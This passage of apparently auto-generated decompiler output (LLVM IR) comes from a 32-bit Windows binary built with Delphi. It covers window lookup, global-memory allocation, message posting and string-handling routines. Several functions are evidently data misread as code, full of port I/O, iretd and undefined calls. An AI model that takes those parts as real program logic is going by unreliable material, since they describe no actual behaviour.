  %9 = call i32* @FindWindowExA(i32* null, i32* bitcast ([7 x i8]* @global_var_405eb0 to i32*), i8* null, i8* %8), !insn.addr !1141
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1141
  store i32 %10, i32* %stack_var_-48, align 4, !insn.addr !1142
  %11 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1142
  %12 = call i1 @IsWindow(i32* %9), !insn.addr !1143
  %13 = icmp eq i1 %12, false, !insn.addr !1144
  store i32 %11, i32* %esp.0.reg2mem, !insn.addr !1145
  br i1 %13, label %dec_label_pc_405ea2, label %dec_label_pc_405df6, !insn.addr !1145

dec_label_pc_405df6:                              ; preds = %dec_label_pc_405dcd
  %14 = call i32 @function_4034c8(), !insn.addr !1146
  %15 = add i32 %14, 22, !insn.addr !1147
  store i32 66, i32* %stack_var_-56, align 4, !insn.addr !1148
  %16 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1148
  %17 = call i32* @GlobalAlloc(i32 %15, i32 66), !insn.addr !1149
  %18 = icmp eq i32* %17, null, !insn.addr !1150
  store i32 %16, i32* %esp.0.reg2mem, !insn.addr !1151
  br i1 %18, label %dec_label_pc_405ea2, label %dec_label_pc_405e15, !insn.addr !1151

dec_label_pc_405e15:                              ; preds = %dec_label_pc_405df6
  %19 = call i32* @GlobalLock(i32* nonnull %17), !insn.addr !1152
  %20 = icmp eq i32* %19, null, !insn.addr !1153
  %21 = icmp eq i1 %20, false, !insn.addr !1154
  br i1 %21, label %dec_label_pc_405e29, label %dec_label_pc_405e21, !insn.addr !1154

dec_label_pc_405e21:                              ; preds = %dec_label_pc_405e15
  %22 = bitcast i32* %17 to i8*, !insn.addr !1155
  store i8* %22, i8** %stack_var_-64, align 4, !insn.addr !1155
  %23 = ptrtoint i8** %stack_var_-64 to i32, !insn.addr !1155
  %24 = call i32* @GlobalFree(i32* nonnull %17), !insn.addr !1156
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1157
  br label %dec_label_pc_405ea2, !insn.addr !1157

dec_label_pc_405e29:                              ; preds = %dec_label_pc_405e15
  %25 = ptrtoint i32* %17 to i32, !insn.addr !1149
  %26 = ptrtoint i32* %19 to i32, !insn.addr !1152
  store i32 20, i32* %19, align 4, !insn.addr !1158
  %27 = add i32 %26, 4, !insn.addr !1159
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1159
  store i32 0, i32* %28, align 4, !insn.addr !1159
  %29 = add i32 %26, 8, !insn.addr !1160
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1160
  store i32 0, i32* %30, align 4, !insn.addr !1160
  %31 = add i32 %26, 12, !insn.addr !1161
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1161
  store i32 0, i32* %32, align 4, !insn.addr !1161
  %33 = add i32 %26, 16, !insn.addr !1162
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1162
  store i32 0, i32* %34, align 4, !insn.addr !1162
  %35 = call i32 @function_4036c8(), !insn.addr !1163
  %36 = inttoptr i32 %35 to i8*, !insn.addr !1164
  store i8* %36, i8** %stack_var_-64, align 4, !insn.addr !1164
  %37 = add i32 %26, 20, !insn.addr !1165
  %38 = inttoptr i32 %37 to i8*, !insn.addr !1166
  %39 = call i8* @lstrcpyA(i8* %36, i8* %38), !insn.addr !1167
  %40 = call i1 @GlobalUnlock(i32* nonnull %17), !insn.addr !1168
  %41 = call i1 @PostMessageA(i32* null, i32 %25, i32 563, i32 %10), !insn.addr !1169
  %42 = call i32 @function_4073c8(i32 4218552, i32 2000, i32 -1), !insn.addr !1170
  store i32 %42, i32* %stack_var_-104, align 4, !insn.addr !1171
  %43 = ptrtoint i32* %stack_var_-104 to i32, !insn.addr !1171
  %44 = inttoptr i32 %42 to i32*, !insn.addr !1172
  %45 = call i1 @IsWindow(i32* %44), !insn.addr !1172
  %46 = icmp eq i1 %45, false, !insn.addr !1173
  store i32 %43, i32* %esp.0.reg2mem, !insn.addr !1174
  br i1 %46, label %dec_label_pc_405ea2, label %dec_label_pc_405e93, !insn.addr !1174

dec_label_pc_405e93:                              ; preds = %dec_label_pc_405e29
  store i32 %42, i32* %stack_var_-120, align 4, !insn.addr !1175
  %47 = ptrtoint i32* %stack_var_-120 to i32, !insn.addr !1175
  %48 = call i32 @SendMessageA(i32* null, i32 0, i32 245, i32 %42), !insn.addr !1176
  store i32 %47, i32* %esp.0.reg2mem, !insn.addr !1176
  br label %dec_label_pc_405ea2, !insn.addr !1176

dec_label_pc_405ea2:                              ; preds = %dec_label_pc_405e93, %dec_label_pc_405e29, %dec_label_pc_405e21, %dec_label_pc_405df6, %dec_label_pc_405dcd, %dec_label_pc_405db2, %dec_label_pc_405d98
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %49 = add i32 %esp.0.reload, 4, !insn.addr !1177
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1177
  %51 = load i32, i32* %50, align 4, !insn.addr !1177
  ret i32 %51, !insn.addr !1178
}

define i32 @function_405ead() local_unnamed_addr {
dec_label_pc_405ead:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %ebx = alloca i32, align 4
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = trunc i32 %4 to i8
  %6 = mul i8 %5, 2, !insn.addr !1179
  %7 = inttoptr i32 %4 to i8*, !insn.addr !1179
  store i8 %6, i8* %7, align 1, !insn.addr !1179
  %8 = bitcast i32* %ebx to i8*
  %9 = load i8, i8* %8, align 4, !insn.addr !1180
  %10 = udiv i32 %4, 256, !insn.addr !1180
  %11 = trunc i32 %10 to i8, !insn.addr !1180
  %12 = add i8 %9, %11, !insn.addr !1180
  %13 = load i32, i32* %ebx, align 4, !insn.addr !1180
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1180
  store i8 %12, i8* %14, align 1, !insn.addr !1180
  %15 = and i32 %4, 14
  %16 = icmp ugt i32 %15, 9, !insn.addr !1181
  %17 = add i32 %4, 6, !insn.addr !1181
  %18 = select i1 %16, i32 %17, i32 %4, !insn.addr !1181
  %19 = zext i1 %16 to i32, !insn.addr !1181
  %20 = and i32 %4, -65536, !insn.addr !1181
  %21 = and i32 %18, 14
  %22 = icmp ugt i32 %21, 9, !insn.addr !1182
  %23 = or i1 %16, %22, !insn.addr !1182
  %24 = add i32 %18, 6, !insn.addr !1182
  %25 = select i1 %23, i32 %24, i32 %18, !insn.addr !1182
  %26 = zext i1 %23 to i32, !insn.addr !1182
  %27 = and i32 %25, 15, !insn.addr !1182
  %28 = or i32 %27, %20, !insn.addr !1182
  %reass.add = add nuw nsw i32 %26, %19
  %reass.mul = mul i32 %reass.add, 256
  %29 = add i32 %reass.mul, %4
  %30 = and i32 %29, 65280, !insn.addr !1182
  %31 = or i32 %28, %30, !insn.addr !1182
  %32 = inttoptr i32 %31 to i8*, !insn.addr !1183
  %33 = load i8, i8* %32, align 1, !insn.addr !1183
  %34 = trunc i32 %27 to i8, !insn.addr !1183
  %35 = xor i8 %33, %34, !insn.addr !1183
  store i8 %35, i8* %32, align 1, !insn.addr !1183
  %36 = add i32 %0, 1311123697, !insn.addr !1184
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1184
  %38 = load i8, i8* %37, align 1, !insn.addr !1184
  %39 = udiv i32 %3, 256, !insn.addr !1184
  %40 = trunc i32 %39 to i8, !insn.addr !1184
  %41 = add i8 %38, %40, !insn.addr !1184
  store i8 %41, i8* %37, align 1, !insn.addr !1184
  %42 = inttoptr i32 %31 to i32*, !insn.addr !1185
  %43 = load i32, i32* %42, align 4, !insn.addr !1185
  %44 = sub i32 %43, %31, !insn.addr !1185
  store i32 %44, i32* %42, align 4, !insn.addr !1185
  %45 = add i32 %3, 117, !insn.addr !1186
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1186
  %47 = load i8, i8* %46, align 1, !insn.addr !1186
  %48 = add i8 %47, %34, !insn.addr !1186
  %49 = icmp eq i8 %48, 0, !insn.addr !1186
  store i8 %48, i8* %46, align 1, !insn.addr !1186
  br i1 %49, label %dec_label_pc_405f38, label %dec_label_pc_405ec4, !insn.addr !1187

dec_label_pc_405ec4:                              ; preds = %dec_label_pc_405ead
  %50 = xor i32 %3, %1, !insn.addr !1188
  %51 = trunc i32 %3 to i16, !insn.addr !1189
  %52 = inttoptr i32 %50 to i32*, !insn.addr !1189
  %53 = load i32, i32* %52, align 4, !insn.addr !1189
  call void @__asm_outsd(i16 %51, i32 %53), !insn.addr !1189
  %54 = inttoptr i32 %50 to i8*, !insn.addr !1190
  %55 = load i8, i8* %54, align 1, !insn.addr !1190
  call void @__asm_outsb(i16 %51, i8 %55), !insn.addr !1190
  %56 = load i8, i8* %32, align 1, !insn.addr !1191
  %57 = add i8 %56, %34, !insn.addr !1191
  store i8 %57, i8* %32, align 1, !insn.addr !1191
  %58 = load i32, i32* %ebx, align 4, !insn.addr !1192
  %59 = and i32 %58, -65281, !insn.addr !1192
  %60 = or i32 %59, 48384, !insn.addr !1192
  %61 = call i32 @__asm_iretd(), !insn.addr !1193
  %62 = add i32 %2, -117, !insn.addr !1194
  %63 = inttoptr i32 %62 to i8*, !insn.addr !1194
  %64 = load i8, i8* %63, align 1, !insn.addr !1194
  %65 = add i8 %64, -69, !insn.addr !1194
  store i8 %65, i8* %63, align 1, !insn.addr !1194
  %66 = call i8 @__asm_in(i16 -11077), !insn.addr !1195
  %67 = call i32 @function_405d5c(i32 %60), !insn.addr !1196
  ret i32 %67, !insn.addr !1197

dec_label_pc_405f38:                              ; preds = %dec_label_pc_405ead
  %68 = icmp ne i8 %47, 0, !insn.addr !1186
  %69 = add i32 %3, 80, !insn.addr !1198
  %70 = inttoptr i32 %69 to i8*, !insn.addr !1198
  %71 = load i8, i8* %70, align 1, !insn.addr !1198
  %72 = trunc i32 %3 to i8, !insn.addr !1198
  %73 = zext i1 %68 to i8, !insn.addr !1198
  %74 = add i8 %73, %72, !insn.addr !1198
  %75 = add i8 %74, %71, !insn.addr !1198
  store i8 %75, i8* %70, align 1, !insn.addr !1198
  %76 = add i32 %2, 8, !insn.addr !1199
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1199
  %78 = load i32, i32* %77, align 4, !insn.addr !1199
  %79 = call i32 @function_405d5c(i32 %78), !insn.addr !1200
  ret i32 %79, !insn.addr !1201
}

define i32 @function_405f50(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_405f50:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1202
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !1202
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1202
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1203
  %2 = call i32 @"@LStrFromPChar"(), !insn.addr !1204
  %3 = call i32 @"@LStrPos"(), !insn.addr !1205
  %4 = call i32 @"@LStrFromPChar"(), !insn.addr !1206
  %5 = call i32 @"@LStrPos"(), !insn.addr !1207
  %6 = call i32 @function_405d5c(i32 %arg1), !insn.addr !1208
  call void @__writefsdword(i32 0, i32 %arg6), !insn.addr !1209
  %7 = call i32 @"@LStrArrayClr"(), !insn.addr !1210
  ret i32 %7, !insn.addr !1211
}

define i32 @function_405fe8() local_unnamed_addr {
dec_label_pc_405fe8:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1212
  ret i32 %0, !insn.addr !1212
}

define i32 @function_405fed() local_unnamed_addr {
dec_label_pc_405fed:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1213
}

define i32 @function_405fef(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_405fef:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1214
}

define i32 @function_405fff() local_unnamed_addr {
dec_label_pc_405fff:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1215
}

define i32 @function_40604c() local_unnamed_addr {
dec_label_pc_40604c:
  %0 = call i32 @function_405bd0(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_4060bc, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_4060c8, i32 0, i32 0), i32 4218580), !insn.addr !1216
  store i32 %0, i32* @global_var_408100, align 4, !insn.addr !1217
  %1 = call i32 @function_405bd0(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_4060bc, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_4060e4, i32 0, i32 0), i32 4218656), !insn.addr !1218
  store i32 %1, i32* @global_var_408104, align 4, !insn.addr !1219
  %2 = call i32 @function_405bd0(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_4060fc, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_406108, i32 0, i32 0), i32 4218704), !insn.addr !1220
  store i32 %2, i32* @global_var_408108, align 4, !insn.addr !1221
  ret i32 %2, !insn.addr !1222
}

define i32 @function_4060bc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12, i32 %arg13, i32 %arg14) local_unnamed_addr {
dec_label_pc_4060bc:
  %merge.reg2mem = alloca i32, !insn.addr !1223
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %6 = call i32 @__decompiler_undefined_function_0()
  %7 = call i1 @__decompiler_undefined_function_1()
  %8 = call i1 @__decompiler_undefined_function_1()
  %9 = call i32 @__decompiler_undefined_function_0()
  %10 = icmp eq i1 %7, false, !insn.addr !1223
  br i1 %10, label %dec_label_pc_4060eb, label %dec_label_pc_4060be, !insn.addr !1223

dec_label_pc_4060be:                              ; preds = %dec_label_pc_4060bc
  br i1 %8, label %dec_label_pc_4060f4, label %dec_label_pc_4060c1, !insn.addr !1224

dec_label_pc_4060c1:                              ; preds = %dec_label_pc_4060be
  %11 = trunc i32 %4 to i16, !insn.addr !1225
  %12 = call i8 @__asm_insb(i16 %11), !insn.addr !1225
  %13 = inttoptr i32 %0 to i8*, !insn.addr !1225
  store i8 %12, i8* %13, align 1, !insn.addr !1225
  %14 = call i8 @__asm_insb(i16 %11), !insn.addr !1226
  store i8 %14, i8* %13, align 1, !insn.addr !1226
  %15 = bitcast i32* %eax to i8*
  %16 = load i8, i8* %15, align 4, !insn.addr !1227
  %17 = load i32, i32* %eax, align 4
  %18 = trunc i32 %17 to i8, !insn.addr !1227
  %19 = add i8 %16, %18, !insn.addr !1227
  %20 = inttoptr i32 %17 to i8*, !insn.addr !1227
  store i8 %19, i8* %20, align 1, !insn.addr !1227
  call void @__asm_outsd(i16 %11, i32 %1), !insn.addr !1228
  %21 = trunc i32 %arg10 to i16, !insn.addr !1229
  %22 = call i32 @__asm_insd(i16 %21), !insn.addr !1229
  %23 = inttoptr i32 %9 to i32*, !insn.addr !1229
  store i32 %22, i32* %23, align 4, !insn.addr !1229
  store i32 %arg1, i32* %eax, align 4, !insn.addr !1230
  %24 = inttoptr i32 %arg1 to i8*, !insn.addr !1231
  %25 = load i8, i8* %24, align 1, !insn.addr !1231
  %26 = trunc i32 %arg1 to i8, !insn.addr !1231
  %27 = add i8 %25, %26, !insn.addr !1231
  store i8 %27, i8* %24, align 1, !insn.addr !1231
  %28 = trunc i32 %arg3 to i16, !insn.addr !1232
  %29 = inttoptr i32 %arg6 to i32*, !insn.addr !1232
  %30 = load i32, i32* %29, align 4, !insn.addr !1232
  call void @__asm_outsd(i16 %28, i32 %30), !insn.addr !1232
  %31 = add i32 %arg5, 67, !insn.addr !1233
  %32 = and i32 %31, 65535
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1233
  %34 = load i32, i32* %33, align 4, !insn.addr !1233
  %35 = load i8, i8* %24, align 1, !insn.addr !1234
  %36 = add i8 %35, %26, !insn.addr !1234
  store i8 %36, i8* %24, align 1, !insn.addr !1234
  %37 = mul i32 %34, 1557718248, !insn.addr !1235
  %38 = add i32 %arg7, 97, !insn.addr !1235
  %39 = add i32 %38, %37, !insn.addr !1235
  %40 = inttoptr i32 %39 to i8*, !insn.addr !1235
  %41 = load i8, i8* %40, align 1, !insn.addr !1235
  %42 = trunc i32 %arg2 to i8
  %43 = add i8 %42, 1, !insn.addr !1235
  %44 = add i8 %43, %41, !insn.addr !1235
  %45 = icmp eq i8 %44, 0, !insn.addr !1235
  store i8 %44, i8* %40, align 1, !insn.addr !1235
  %46 = load i32, i32* %eax, align 4
  store i32 %46, i32* %merge.reg2mem, !insn.addr !1236
  br i1 %45, label %dec_label_pc_40615d, label %dec_label_pc_4060eb, !insn.addr !1236

dec_label_pc_4060eb:                              ; preds = %dec_label_pc_4060bc, %dec_label_pc_4060c1
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !1237

dec_label_pc_4060f4:                              ; preds = %dec_label_pc_4060be
  %47 = trunc i32 %6 to i8
  %48 = mul i8 %47, 2, !insn.addr !1238
  %49 = inttoptr i32 %6 to i8*, !insn.addr !1238
  store i8 %48, i8* %49, align 1, !insn.addr !1238
  %50 = add i32 %3, 104, !insn.addr !1239
  %51 = inttoptr i32 %50 to i8*, !insn.addr !1239
  %52 = load i8, i8* %51, align 1, !insn.addr !1239
  %53 = udiv i32 %4, 256, !insn.addr !1239
  %54 = trunc i32 %53 to i8, !insn.addr !1239
  %55 = add i8 %52, %54, !insn.addr !1239
  store i8 %55, i8* %51, align 1, !insn.addr !1239
  %56 = trunc i32 %4 to i16, !insn.addr !1240
  %57 = call i8 @__asm_insb(i16 %56), !insn.addr !1240
  %58 = inttoptr i32 %0 to i8*, !insn.addr !1240
  store i8 %57, i8* %58, align 1, !insn.addr !1240
  %59 = call i8 @__asm_insb(i16 %56), !insn.addr !1241
  store i8 %59, i8* %58, align 1, !insn.addr !1241
  %60 = call i8 @__asm_insb(i16 %56), !insn.addr !1242
  store i8 %60, i8* %58, align 1, !insn.addr !1242
  %61 = call i8 @__asm_insb(i16 %56), !insn.addr !1243
  store i8 %61, i8* %58, align 1, !insn.addr !1243
  %62 = load i8, i8* %51, align 1, !insn.addr !1244
  %63 = trunc i32 %4 to i8, !insn.addr !1244
  %64 = add i8 %62, %63, !insn.addr !1244
  store i8 %64, i8* %51, align 1, !insn.addr !1244
  %65 = call i8 @__asm_insb(i16 %56), !insn.addr !1245
  store i8 %65, i8* %58, align 1, !insn.addr !1245
  %66 = call i8 @__asm_insb(i16 %56), !insn.addr !1246
  store i8 %66, i8* %58, align 1, !insn.addr !1246
  %67 = add i32 %2, 1, !insn.addr !1247
  %68 = icmp slt i32 %67, 0, !insn.addr !1247
  br i1 %68, label %dec_label_pc_406175, label %dec_label_pc_406110, !insn.addr !1248

dec_label_pc_406110:                              ; preds = %dec_label_pc_4060f4
  %69 = mul i32 %1, 256
  %70 = and i32 %69, 65280
  %71 = xor i32 %5, %70, !insn.addr !1249
  %72 = xor i32 %4, %1, !insn.addr !1250
  %73 = bitcast i32* %eax to i8*
  %74 = add i32 %2, 117, !insn.addr !1251
  %75 = inttoptr i32 %74 to i16*, !insn.addr !1251
  %76 = load i16, i16* %75, align 2, !insn.addr !1251
  %77 = trunc i32 %72 to i16, !insn.addr !1251
  call void @__asm_arpl(i16 %76, i16 %77), !insn.addr !1251
  %78 = load i8, i8* %73, align 4, !insn.addr !1252
  %79 = load i32, i32* %eax, align 4
  %80 = trunc i32 %79 to i8, !insn.addr !1252
  %81 = add i8 %78, %80, !insn.addr !1252
  %82 = inttoptr i32 %79 to i8*, !insn.addr !1252
  store i8 %81, i8* %82, align 1, !insn.addr !1252
  %83 = add i32 %71, 82, !insn.addr !1253
  %84 = inttoptr i32 %83 to i8*, !insn.addr !1253
  %85 = load i8, i8* %84, align 1, !insn.addr !1253
  %86 = add i8 %85, %63, !insn.addr !1253
  store i8 %86, i8* %84, align 1, !insn.addr !1253
  %87 = load i32, i32* %eax, align 4, !insn.addr !1254
  %88 = add i32 %87, -1, !insn.addr !1254
  %89 = add i32 %71, 4227329, !insn.addr !1255
  %90 = inttoptr i32 %89 to i8*, !insn.addr !1255
  %91 = load i8, i8* %90, align 1, !insn.addr !1255
  %92 = udiv i32 %88, 256, !insn.addr !1255
  %93 = trunc i32 %92 to i8, !insn.addr !1255
  %94 = add i8 %91, %93, !insn.addr !1255
  store i8 %94, i8* %90, align 1, !insn.addr !1255
  ret i32 %88, !insn.addr !1255

dec_label_pc_40615d:                              ; preds = %dec_label_pc_4060c1
  %95 = add i32 %46, 1, !insn.addr !1256
  store i32 %95, i32* %eax, align 4, !insn.addr !1256
  %96 = inttoptr i32 %arg4 to i8*, !insn.addr !1257
  %97 = load i8, i8* %96, align 1, !insn.addr !1257
  %98 = udiv i32 %arg3, 256, !insn.addr !1257
  %99 = trunc i32 %98 to i8, !insn.addr !1257
  %100 = add i8 %97, %99, !insn.addr !1257
  store i8 %100, i8* %96, align 1, !insn.addr !1257
  %101 = add i32 %arg3, 89, !insn.addr !1258
  %102 = inttoptr i32 %101 to i8*, !insn.addr !1258
  store i8 -1, i8* %102, align 1, !insn.addr !1258
  call void @__writefsdword(i32 %95, i32 %arg3), !insn.addr !1259
  %103 = load i32, i32* %eax, align 4, !insn.addr !1260
  ret i32 %103, !insn.addr !1260

dec_label_pc_406175:                              ; preds = %dec_label_pc_4060f4
  %104 = load i32, i32* %eax, align 4, !insn.addr !1261
  ret i32 %104, !insn.addr !1261
}

define i32 @function_406178() local_unnamed_addr {
dec_label_pc_406178:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1262
  %2 = add i32 %1, -1, !insn.addr !1262
  store i32 %2, i32* @global_var_4096c0, align 4, !insn.addr !1262
  ret i32 %0, !insn.addr !1263
}

define i32 @function_406180(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_406180:
  %ebp.0.reg2mem = alloca i32, !insn.addr !1264
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %1 to i8
  %4 = trunc i32 %0 to i8, !insn.addr !1265
  %5 = add i8 %3, %4, !insn.addr !1265
  %6 = inttoptr i32 %1 to i8*, !insn.addr !1265
  store i8 %5, i8* %6, align 1, !insn.addr !1265
  %7 = trunc i32 %2 to i8, !insn.addr !1266
  %8 = mul i32 %2, 2, !insn.addr !1266
  %9 = inttoptr i32 %8 to i8*, !insn.addr !1266
  %10 = load i8, i8* %9, align 2, !insn.addr !1266
  %11 = xor i8 %10, %7, !insn.addr !1266
  %12 = zext i8 %11 to i32, !insn.addr !1266
  %13 = and i32 %2, -256, !insn.addr !1266
  %14 = or i32 %13, %12, !insn.addr !1266
  %15 = inttoptr i32 %14 to i8*, !insn.addr !1267
  %16 = load i8, i8* %15, align 1, !insn.addr !1267
  %17 = add i8 %11, %4, !insn.addr !1267
  %18 = add i8 %17, %16, !insn.addr !1268
  store i8 %18, i8* %15, align 1, !insn.addr !1268
  %19 = add i32 %14, 1, !insn.addr !1269
  %20 = inttoptr i32 %19 to i8*, !insn.addr !1270
  %21 = load i8, i8* %20, align 1, !insn.addr !1270
  %22 = trunc i32 %19 to i8, !insn.addr !1271
  %23 = add i8 %21, %5, !insn.addr !1271
  %24 = add i8 %23, %22, !insn.addr !1272
  store i8 %24, i8* %20, align 1, !insn.addr !1272
  %25 = add i32 %14, 2, !insn.addr !1273
  %26 = inttoptr i32 %25 to i8*, !insn.addr !1274
  %27 = load i8, i8* %26, align 1, !insn.addr !1274
  %28 = add i8 %27, %3, !insn.addr !1274
  store i8 %28, i8* %26, align 1, !insn.addr !1274
  %29 = trunc i32 %arg4 to i16, !insn.addr !1275
  %30 = call i32 @__asm_insd(i16 %29), !insn.addr !1275
  %31 = inttoptr i32 %arg8 to i32*, !insn.addr !1275
  store i32 %30, i32* %31, align 4, !insn.addr !1275
  %32 = call i32 @function_403c90(), !insn.addr !1276
  %33 = icmp slt i32 %32, 0, !insn.addr !1277
  br i1 %33, label %dec_label_pc_4061d4, label %dec_label_pc_406215.loopexit, !insn.addr !1278

dec_label_pc_4061d4:                              ; preds = %dec_label_pc_406180
  %34 = call i32 @function_403c88(), !insn.addr !1279
  %35 = call i32 @"@DynArraySetLength"(), !insn.addr !1280
  %36 = call i32 @function_403c90(), !insn.addr !1281
  %37 = call i32 @"@LStrAsg"(), !insn.addr !1282
  store i32 -1, i32* %ebp.0.reg2mem, !insn.addr !1283
  br label %dec_label_pc_406215, !insn.addr !1283

dec_label_pc_406215.loopexit:                     ; preds = %dec_label_pc_406180
  %38 = call i32 @"@LStrCmp"(), !insn.addr !1284
  store i32 0, i32* %ebp.0.reg2mem
  br label %dec_label_pc_406215

dec_label_pc_406215:                              ; preds = %dec_label_pc_406215.loopexit, %dec_label_pc_4061d4
  %ebp.0.reload = load i32, i32* %ebp.0.reg2mem
  ret i32 %ebp.0.reload, !insn.addr !1285
}

define i32 @function_40621c() local_unnamed_addr {
dec_label_pc_40621c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1286
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1286
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1286
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1287
  %2 = load i32, i32* @global_var_4096c4, align 4, !insn.addr !1288
  %3 = add i32 %2, 1, !insn.addr !1288
  %4 = icmp eq i32 %3, 0, !insn.addr !1288
  store i32 %3, i32* @global_var_4096c4, align 4, !insn.addr !1288
  %5 = icmp eq i1 %4, false, !insn.addr !1289
  br i1 %5, label %dec_label_pc_406245, label %dec_label_pc_406235, !insn.addr !1289

dec_label_pc_406235:                              ; preds = %dec_label_pc_40621c
  %6 = call i32 @"@DynArrayClear"(), !insn.addr !1290
  br label %dec_label_pc_406245, !insn.addr !1290

dec_label_pc_406245:                              ; preds = %dec_label_pc_406235, %dec_label_pc_40621c
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1291
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1292
  ret i32 0, !insn.addr !1293
}

define i32 @function_406253() local_unnamed_addr {
dec_label_pc_406253:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1294
  ret i32 %0, !insn.addr !1294
}

define i32 @function_406258() local_unnamed_addr {
dec_label_pc_406258:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1295
}

define i32 @function_40625a(i32 %arg1) local_unnamed_addr {
dec_label_pc_40625a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1296
}

define i32 @function_40625c() local_unnamed_addr {
dec_label_pc_40625c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1297
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1297
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1297
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1298
  %2 = load i32, i32* @global_var_4096c4, align 4, !insn.addr !1299
  %3 = add i32 %2, -1, !insn.addr !1299
  %4 = icmp eq i32 %2, 0, !insn.addr !1299
  store i32 %3, i32* @global_var_4096c4, align 4, !insn.addr !1299
  %5 = icmp eq i1 %4, false, !insn.addr !1300
  br i1 %5, label %dec_label_pc_406290, label %dec_label_pc_406276, !insn.addr !1300

dec_label_pc_406276:                              ; preds = %dec_label_pc_40625c
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1301
  br label %dec_label_pc_406290, !insn.addr !1302

dec_label_pc_406290:                              ; preds = %dec_label_pc_406276, %dec_label_pc_40625c
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1303
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1304
  ret i32 0, !insn.addr !1305
}

define i32 @function_40629e() local_unnamed_addr {
dec_label_pc_40629e:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1306
  ret i32 %0, !insn.addr !1306
}

define i32 @function_4062a3() local_unnamed_addr {
dec_label_pc_4062a3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1307
}

define i32 @function_4062a5(i32 %arg1) local_unnamed_addr {
dec_label_pc_4062a5:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1308
}

define i32 @function_4062a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_4062a8:
  %esp.0.reg2mem = alloca i32, !insn.addr !1309
  %eax = alloca i32, align 4
  %stack_var_-76 = alloca i8*, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %0 = bitcast i32* %eax to i8*
  %1 = load i8, i8* %0, align 4, !insn.addr !1309
  %2 = load i32, i32* %eax, align 4
  %3 = trunc i32 %2 to i8, !insn.addr !1309
  %4 = add i8 %1, %3, !insn.addr !1309
  %5 = inttoptr i32 %2 to i8*, !insn.addr !1309
